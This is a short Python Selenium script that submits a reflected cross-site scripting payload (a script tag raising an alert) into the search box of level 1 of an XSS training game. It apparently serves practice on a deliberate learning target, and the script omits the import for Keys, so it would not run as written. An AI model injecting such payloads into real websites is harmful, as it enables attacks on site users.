#!/bin/python3
from selenium import webdriver
import time

PATH = "/home/kali/Documents/chromedriver"
driver = webdriver.Chrome(PATH)

driver.get("https://xss-game.appspot.com/level1")

search_xss = driver.find_element_by_name("query")
search_xss.send_keys("<script> alert('HEllo World') </script>")
search_xss.send_keys(Keys.RETURN)

time.sleep(5)
#print(driver.title)
driver.quit()